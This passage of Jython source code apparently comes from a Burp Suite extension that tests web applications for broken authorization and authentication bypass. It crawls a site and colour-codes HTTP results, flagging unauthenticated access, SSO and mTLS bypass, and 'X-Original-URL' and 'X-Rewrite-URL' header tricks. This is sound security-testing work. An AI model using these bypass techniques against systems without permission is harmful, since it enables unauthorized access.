                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(url_regex, link, re.IGNORECASE)) and "/." not in link and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                            _userURLs.append(link)
                            userLinks = userLinks + link + "\n"
                            self._lblAuthNotification.text = "The crawler has found '" + str(len(_userURLs)) + "' links so far, and it is still in progress: '" + str(_userURLs.index(_url) + 1) + "/" + str(crawledURLs + 1) + "', current folder depth: '" + str(folderDepth) + "'."

                if _userURLs.index(_url) == crawledURLs:
                    if folderDepth == self._cbSiteMapDepth.getSelectedIndex():
                        break
                    crawledURLs = len(_userURLs) - 1
                    folderDepth = folderDepth + 1
                
            except:
                self._lblAuthNotification.text = str(sys.exc_info()[1])
        
        self._tbAuthURL.setText(userLinks)
        if len(_userURLs) > 1:
            self._lblAuthNotification.text = "The crawler has just finished, and '" + str(len(_userURLs)) + "' links have been found with folder depth '"+ str(self._cbSiteMapDepth.getSelectedIndex()) +"'. Other hosts than user's session are ignored." 
        else:
            self._lblAuthNotification.text = "The crawler has just finished, and no any links have been found." 
        self._btnAuthNewUserAdd.setEnabled(True)
        self._tbAuthNewUser.setEnabled(True)
        self._cbSiteMapDepth.setEnabled(True)
        self._btnSiteMapGeneratorRun.setEnabled(True)
        return

class UserEnabledRenderer(TableCellRenderer):
    _colorsRed = False
    _colorsOrange = False
    _colorsYellow = False
    def __init__(self, defaultCellRender, userList, tipMessages):
        UserEnabledRenderer._colorsRed = False
        UserEnabledRenderer._colorsOrange = False
        UserEnabledRenderer._colorsYellow = False
        self._defaultCellRender = defaultCellRender
        self.userList = userList
        self.tipMessages = tipMessages
        self.focusX = -1
        self.focusY = -1
        self.colorsUser = [Color(204, 229, 255), Color(204, 255, 204), Color(204, 204, 255), Color(190,220,210)]
        self.colorsAlert = [Color.white, Color(255, 153, 153), Color(255, 218, 185), Color(255, 255, 204), Color(233, 233, 233), Color(255, 204, 204)]

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        cell = self._defaultCellRender.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)
        toolTipMessage = ""
        cell.setBackground(self.colorsAlert[0])
        if len(self.userList[0]) < 10:
            # Authorization Matrix Tab
            try:
                if column == 0:
                    toolTipMessage = "URL list."
                elif table.getValueAt(row, column) and not table.getValueAt(row, column).startswith("HTTP 2") and not table.getValueAt(row, column).startswith("HTTP 3"):
                    # error or http 4XX/5XX
                    cell.setBackground(self.colorsAlert[4])
                    toolTipMessage = "The request returns HTTP 4XX/5xx response!"
                elif column == 1:
                    # no auth
                    if _colorful:
                        for y in range(2, table.getColumnCount()):
                            if table.getValueAt(row, 0) in self.userList[y - 1]:
                                if table.getValueAt(row, y) == table.getValueAt(row, column):
                                    if table.getValueAt(row, y).startswith("HTTP 2"):
                                        cell.setBackground(self.colorsAlert[1])
                                        toolTipMessage = "The URL returns HTTP 2XX without authentication, and the response is same as URL owner!"
                                    elif table.getValueAt(row, y).startswith("HTTP 3"):
                                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                            cell.setBackground(self.colorsAlert[3])
                                            toolTipMessage = "The URL returns HTTP 3XX without authentication, but the response is same as URL owner!"
                                elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                    if not cell.getBackground() == self.colorsAlert[1]:
                                        cell.setBackground(self.colorsAlert[2])
                                        toolTipMessage = "The URL returns same HTTP response code with URL owner, but no authentication!"
                elif table.getValueAt(row, 0) in self.userList[column - 1]:
                    cell.setBackground(self.colorsUser[column - 2])
                    toolTipMessage = "Http response of the user's own URL!"
                else:    
                    # other users
                    if _colorful:
                        for y in range(2, table.getColumnCount()):
                            if table.getValueAt(row, 0) in self.userList[y - 1]:
                                if table.getValueAt(row, y) == table.getValueAt(row, column):
                                    if table.getValueAt(row, y).startswith("HTTP 2"):
                                        cell.setBackground(self.colorsAlert[1])
                                        toolTipMessage = "The URL is not in the user's list, but the response (HTTP 2XX) is same as URL owner!"
                                    elif table.getValueAt(row, y).startswith("HTTP 3"):
                                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                            cell.setBackground(self.colorsAlert[3])
                                            toolTipMessage = "The URL is not in the user's list, but the response (HTTP 3XX) is same as URL owner!"
                                elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                    if not cell.getBackground() == self.colorsAlert[1]:    
                                        cell.setBackground(self.colorsAlert[2])
                                        toolTipMessage = "The URL is not in the user's list, but returns same HTTP response code with URL owner!"
                cell.setToolTipText(toolTipMessage)

                if hasFocus:
                    self.focusX = row
                    self.focusY = column
                    cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC));
                    table.repaint()
                elif self.focusX == row and column == 0:
                    cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                    table.repaint()
            except:
                #print str(sys.exc_info()[1])
                pass

        else:
            #Authentication Bypass Tab
            try:
                if table.getValueAt(row, column):
                    toolTipMessage = self.tipMessages[row][column]

                    if column == 0:
                        if cell.getBackground() == self.colorsAlert[0]:
                            for y in range(1, table.getColumnCount()):
                                if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[1])
                                    UserEnabledRenderer._colorsRed = True
                                    break
                            if not cell.getBackground() == self.colorsAlert[1]:
                                for y in range(1, table.getColumnCount()):
                                    if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[2]:
                                        cell.setBackground(self.colorsAlert[2])
                                        UserEnabledRenderer._colorsOrange = True
                                        break
                            if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                for y in range(1, table.getColumnCount()):
                                    if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[3]:
                                        cell.setBackground(self.colorsAlert[3])
                                        UserEnabledRenderer._colorsYellow = True
                                        break
                    elif column == 1:
                        if _authType == 0:
                            if str(table.getValueAt(row, column)).startswith("2"):
                                cell.setBackground(self.colorsAlert[1])
                                UserEnabledRenderer._colorsRed = True
                                toolTipMessage = "The response returns Http 2XX, even though all session identifiers have been removed!\n" + self.tipMessages[row][column]
                        elif _authType == 1:
                            # SSO
                            if str(table.getValueAt(row, column)).startswith("2"):
                                cell.setBackground(self.colorsAlert[1])
                                UserEnabledRenderer._colorsRed = True
                                toolTipMessage = "The response returns Http 2XX, even though SSO is required!\n" + self.tipMessages[row][column]
                            elif str(table.getValueAt(row, column)).startswith("3") and not str(table.getValueAt(row, column)).endswith("*"):
                                # 302 and 301
                                cell.setBackground(self.colorsAlert[2])
                                UserEnabledRenderer._colorsOrange = True
                                toolTipMessage = "Http 3XX requests are not being redirected to an SSO server!\n" + self.tipMessages[row][column]
                            elif "403" in str(table.getValueAt(row, column)):
                                cell.setBackground(self.colorsAlert[3])
                                UserEnabledRenderer._colorsYellow = True
                                toolTipMessage = "Http 403 might be replied directly by the target system!\n" + self.tipMessages[row][column]
                        elif _authType == 2:
                            # mTLS
                            if str(table.getValueAt(row, column)).startswith('2'):
                                cell.setBackground(self.colorsAlert[1])
                                UserEnabledRenderer._colorsRed = True
                                toolTipMessage = "The server returns Http 2XX without client-side certificate.\n" + self.tipMessages[row][column]
                            elif str(table.getValueAt(row, column)).startswith('3'):
                                cell.setBackground(self.colorsAlert[2])
                                UserEnabledRenderer._colorsOrange = True
                                toolTipMessage = "The server gives responses without client-side certificate.\n" + self.tipMessages[row][column]
                            elif str(table.getValueAt(row, column)).startswith('4') or str(table.getValueAt(row, column)).startswith('5'):
                                cell.setBackground(self.colorsAlert[3])
                                UserEnabledRenderer._colorsYellow = True
                                toolTipMessage = "The server gives responses without client-side certificate.\n" + self.tipMessages[row][column]
                    
                    else:
                        if column == 32:
                          toolTipMessage = "'X-Original-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-") and _authType == 0:
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."
                        elif column == 33:
                          toolTipMessage = "'X-Rewrite-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-") and _authType == 0:
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."
                        elif column == 34:
                          toolTipMessage = "'X-Override-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-") and _authType == 0:
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."

                        if not str(table.getValueAt(row, 1)).startswith("2"):
                            if str(table.getValueAt(row, column)).startswith("2") and not str(table.getValueAt(row, column)).endswith("-"):
                                cell.setBackground(self.colorsAlert[1])
                                UserEnabledRenderer._colorsRed = True
                                toolTipMessage = "The bypass attempt returns Http 2XX!\n" + self.tipMessages[row][column]

                        if _authType == 1:
                            # SSO
                            if str(table.getValueAt(row, column)).startswith('2'):
                                cell.setBackground(self.colorsAlert[1])
                                UserEnabledRenderer._colorsRed = True
                                toolTipMessage = "The response returns Http 2XX, even though SSO is required!\n" + self.tipMessages[row][column]
                            elif str(table.getValueAt(row, column)).startswith("3") and not str(table.getValueAt(row, column)).endswith("*"):
                                # 302 and 301
                                cell.setBackground(self.colorsAlert[2])
                                UserEnabledRenderer._colorsOrange = True
                                toolTipMessage = "Http 3XX requests are not being redirected to an SSO server!\n" + self.tipMessages[row][column]

                        if _authType == 2:
                            # mTLS
                            if str(table.getValueAt(row, column)).startswith('2'):
                                cell.setBackground(self.colorsAlert[1])
                                UserEnabledRenderer._colorsRed = True
                                toolTipMessage = "The server returns Http 2XX without client-side certificate.\n" + self.tipMessages[row][column]
                            elif str(table.getValueAt(row, column)).startswith('3'):
                                cell.setBackground(self.colorsAlert[2])
                                UserEnabledRenderer._colorsOrange = True
                                toolTipMessage = "The server gives responses without client-side certificate.\n" + self.tipMessages[row][column]
                            elif str(table.getValueAt(row, column)).startswith('4') or str(table.getValueAt(row, column)).startswith('5'):
                                cell.setBackground(self.colorsAlert[3])
                                UserEnabledRenderer._colorsYellow = True
                                toolTipMessage = "The server gives responses without client-side certificate.\n" + self.tipMessages[row][column]

                    cell.setToolTipText(toolTipMessage)

                    if hasFocus:
                        self.focusX = row
                        self.focusY = column
                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2] and not cell.getBackground() == self.colorsAlert[3]:
                            cell.setBackground(Color(219,219,219))
                        cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC));
                        table.repaint()
                    elif self.focusX == row and column == 0:
                        cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                        table.repaint()
            except:
                # print str(sys.exc_info()[1])
                pass
        return cell

class CustomDefaultTableModel(DefaultTableModel):
    def __init__(self, data, headings):
        DefaultTableModel.__init__(self, data, headings)

    def isCellEditable(self, row, col):
        return False
